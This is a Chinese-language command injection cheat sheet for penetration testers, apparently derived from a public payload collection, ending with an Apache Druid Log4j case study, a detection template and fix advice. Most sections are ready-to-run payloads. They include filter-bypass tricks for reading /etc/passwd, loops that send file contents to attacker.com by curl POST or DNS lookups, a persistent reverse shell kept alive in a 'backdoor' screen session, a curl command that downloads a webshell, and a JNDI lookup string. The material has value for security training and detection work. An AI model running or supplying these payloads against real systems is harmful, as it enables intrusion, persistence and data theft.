# 命令注入(Command Injection)

> 命令注入是一种安全漏洞，允许攻击者在易受攻击的应用程序中执行任意命令。

## 目录

- [命令注入(Command Injection)](#命令注入command-injection)
  - [目录](#目录)
  - [工具](#工具)
  - [方法学](#方法学)
    - [基本命令](#基本命令)
    - [命令链](#命令链)
    - [参数注入](#参数注入)
    - [命令内部注入](#命令内部注入)
  - [过滤器绕过](#过滤器绕过)
    - [无空格绕过](#无空格绕过)
    - [使用换行符绕过](#使用换行符绕过)
  - [数据外泄](#数据外泄)
    - [基于时间的数据外泄](#基于时间的数据外泄)
    - [基于DNS的数据外泄](#基于dns的数据外泄)
  - [多语言命令注入](#多语言命令注入)
  - [技巧](#技巧)
    - [后台运行长时间命令](#后台运行长时间命令)
    - [删除注入点后的参数](#删除注入点后的参数)
  - [实验环境](#实验环境)
    - [挑战](#挑战)
  - [参考资料](#参考资料)
  - [相关案例举例：Apache Druid Log4j 命令注入漏洞](#相关案例举例apache-druid-log4j-命令注入漏洞)
    - [漏洞简介](#漏洞简介)
    - [漏洞原理说明](#漏洞原理说明)
    - [检测逻辑举例（YAML内容解析）](#检测逻辑举例yaml内容解析)
    - [修复建议](#修复建议)

## 工具

* [commixproject/commix](https://github.com/commixproject/commix) - 自动化的一体化操作系统命令注入和利用工具
* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - 一个OOB交互收集服务器和客户端库

## 方法学

命令注入，也称为shell注入，是一种攻击类型，攻击者可以通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供数据（表单、cookies、HTTP头等）传递给系统shell时，就可能存在此漏洞。在这种情况下，系统shell是一个命令行界面，用于处理要执行的命令，通常在Unix或Linux系统上。

命令注入的危险在于它可能允许攻击者在系统上执行任何命令，可能导致完全系统被攻陷。

**PHP命令注入示例**：
假设您有一个PHP脚本，它接受用户输入来ping指定的IP地址或域名：

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

在上面的代码中，PHP脚本使用`system()`函数执行`ping`命令，使用通过`ip` GET参数提供的IP地址或域名。

如果攻击者提供类似`8.8.8.8; cat /etc/passwd`的输入，实际执行的命令将是：`ping -c 4 8.8.8.8; cat /etc/passwd`。

这意味着系统将首先`ping 8.8.8.8`，然后执行`cat /etc/passwd`命令，这将显示`/etc/passwd`文件的内容，可能泄露敏感信息。

### 基本命令

执行命令，然后完成 :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

### 命令链

在许多命令行界面中，尤其是类Unix系统，有几个字符可用于链接或操作命令。

* `;` (分号)：允许您顺序执行多个命令。
* `&&` (AND)：仅当第一个命令成功（返回零退出状态）时才执行第二个命令。
* `||` (OR)：仅当第一个命令失败（返回非零退出状态）时才执行第二个命令。
* `&` (后台)：在后台执行命令，允许用户继续使用shell。
* `|` (管道)：将第一个命令的输出作为第二个命令的输入。

```powershell
command1; command2   # 执行command1，然后执行command2
command1 && command2 # 仅在command1成功时执行command2
command1 || command2 # 仅在command1失败时执行command2
command1 & command2  # 在后台执行command1
command1 | command2  # 将command1的输出通过管道传递给command2
```

### 参数注入

当您只能向现有命令追加参数时获得命令执行。
使用此网站[Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/)查找要注入的参数以获得命令执行。

* Chrome

    ```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
    ```

* SSH

    ```ps1
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
    ```

* psql

    ```ps1
    psql -o'|id>/tmp/foo'
    ```

参数注入可以使用[worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)技术进行滥用。

在以下示例中，有效负载`＂ --use-askpass=calc ＂`使用**全角双引号**(U+FF02)而不是**常规双引号**(U+0022)

```php
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

有时，可能无法直接从注入执行命令，但您可能能够将流重定向到特定文件，从而部署Web shell。

* curl

    ```ps1
    # -o, --output <file>        写入文件而不是标准输出
    curl http://evil.attacker.com/ -o webshell.php
    ```

### 命令内部注入

* 使用反引号进行命令注入。

  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```

* 使用命令替换进行注入

  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```

## 过滤器绕过

### 无空格绕过

* `$IFS`是一个特殊的shell变量，称为内部字段分隔符。默认情况下，在许多shell中，它包含空白字符（空格、制表符、换行符）。当在命令中使用时，shell会将`$IFS`解释为空格。`$IFS`不能直接在`ls`、`wget`等命令中作为分隔符使用；请改用`${IFS}`。

  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```

* 在某些shell中，花括号扩展会生成任意字符串。执行时，shell会将大括号内的项目视为单独的命令或参数。

  ```powershell
  {cat,/etc/passwd}
  ```

* 输入重定向。`<`字符告诉shell读取指定文件的内容。

  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```

* ANSI-C引用

  ```powershell
  X=$'uname\x20-a'&&$X
  ```

* 制表符有时可以用作空格的替代。在ASCII中，制表符由十六进制值`09`表示。

  ```powershell
  ;ls%09-al%09/home
  ```

* 在Windows中，`%VARIABLE:~start,length%`是用于环境变量子字符串操作的语法。

  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```

### 使用换行符绕过

命令也可以与换行符一起按顺序运行

```bash
original_cmd_by_server
```

## 数据外泄

### 基于时间的数据外泄

```bash
# Linux
cat /etc/passwd | while read line; do sleep 1; echo $line | curl -X POST --data-binary @- http://attacker.com/; done

# Windows
type C:\Windows\System32\drivers\etc\hosts | for /L %i in (1,1,1000) do @for /f "tokens=1,2 delims=:" %a in ('findstr /n ^^') do @(ping -n 1 -w 1 127.0.0.1 >nul & echo %b | nc -nv 192.168.1.100 80)
```

### 基于DNS的数据外泄

```bash
# Linux
data=$(cat /etc/passwd | base64 -w 0) && for i in $(seq 0 $((${#data}/4))); do dig @192.168.1.100 "$i.$(echo $data | cut -c $(($i*4+1))-$(($i*4+4))).attacker.com"; done

# Windows
for /f "tokens=*" %a in ('type C:\Windows\System32\drivers\etc\hosts') do start /b nslookup "%a".attacker.com 192.168.1.100
```

## 多语言命令注入

```bash
# PHP
'; system('id'); //
"; system('id'); //
`id`
$(id)

# Python
eval('import os; os.system("id")')
__import__('os').system('id')

# Node.js
require('child_process').exec('id')
```

## 技巧

### 后台运行长时间命令

```bash
# 使用nohup
nohup ping -i 30 127.0.0.1 &


# 使用screen
yum install -y screen && screen -dmS backdoor bash -c 'while true; do /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 30; done'
```

### 删除注入点后的参数

```bash
original_cmd_by_server; original_argument='' && id
```

## 实验环境

* [OWASP Juice Shop - Command Injection](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project)
* [DVWA - Command Injection](http://www.dvwa.co.uk/)
* [WebGoat - Command Injection](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project)

### 挑战

1. 尝试利用命令注入漏洞读取`/etc/passwd`文件。
2. 尝试在没有空格的情况下执行命令。
3. 尝试使用不同的命令分隔符。
4. 尝试将命令输出重定向到Web服务器。
5. 尝试获取反向shell。

## 参考资料

* [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
* [Argument Injection Vectors - SonarSource - February 21, 2023](https://sonarsource.github.io/argument-injection-vectors/)
* [Back to the Future: Unix Wildcards Gone Wild - Leon Juranic - June 25, 2014](https://www.exploit-db.com/papers/33930)
* [Bash Snippets for Pentesters - Osanda Malith - March 18, 2017](https://highon.coffee/blog/bash-snippets-for-pentesters/)
* [Command Injection - OWASP](https://owasp.org/www-community/attacks/Command_Injection)
* [Command Injection - PortSwigger](https://portswigger.net/web-security/os-command-injection)
* [Command Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)
* [Command Injection Payload List - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
* [Exploiting Timed Based RCE - David Bernal - August 20, 2019](https://www.dav1d8.com/blog/2019/08/20/exploiting-timed-based-rce/)
* [Linux Privilege Escalation using Misconfigured LD_LIBRARY_PATH - Raj Chandel - February 10, 2018](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
* [Penetration Testing: Command Injection - NetbiosX - June 20, 2017](https://www.hackingarticles.in/penetration-testing-command-injection/)
* [The Art of Command Injection - Osanda Malith - January 29, 2015](https://www.exploit-db.com/papers/33930)
* [Windows Command Injection - NetbiosX - June 20, 2017](https://www.hackingarticles.in/windows-command-injection/)

---

## 相关案例举例：Apache Druid Log4j 命令注入漏洞

### 漏洞简介

以 [`apache-druid-log4j.yaml`](../apache-druid-log4j.yaml) 为例，Apache Druid 在特定配置和版本下，因集成了受影响的 Log4j 组件，存在命令注入风险。攻击者可通过构造恶意请求，利用 Log4j 的 JNDI 注入特性，最终在目标服务器上执行任意命令。

### 漏洞原理说明

该漏洞属于典型的命令注入场景。Log4j 在处理日志消息时，如果日志内容中包含特定的 JNDI 语法（如 `${jndi:ldap://attacker.com/a}`），会自动发起远程请求并加载恶意类，导致远程代码执行。攻击者只需将恶意 payload 注入到日志参数中（如 HTTP 请求头、参数等），即可触发漏洞。

这种类型的漏洞与命令注入的本质一致：都是由于应用程序未对用户输入进行严格校验，导致攻击者能够控制底层命令或代码的执行流程。

### 检测逻辑举例（YAML内容解析）

以下为该漏洞的检测YAML片段示例：

```yaml
id: apache-druid-log4j

http:
  - method: GET
    path:
      - "{{BaseURL}}/druid/indexer/v1/sampler"
    headers:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "ldap"
```

**检测流程说明：**

1. **请求方式**：GET，目标路径为 `/druid/indexer/v1/sampler`。
2. **关键Header**：设置 `User-Agent` 为 `${jndi:ldap://{{interactsh-url}}/a}`，利用 JNDI 注入特性。
3. **响应匹配**：通过 OOB（Out-Of-Band）交互平台（如 interactsh）检测是否有 LDAP 请求回连，判定目标存在该漏洞。

### 修复建议

- 升级 Apache Druid 及其依赖的 Log4j 组件至官方修复版本。
- 禁用 Log4j 的 JNDI 功能，或限制其加载远程类的能力。
- 对所有用户输入进行严格校验，避免日志记录敏感或可控内容。

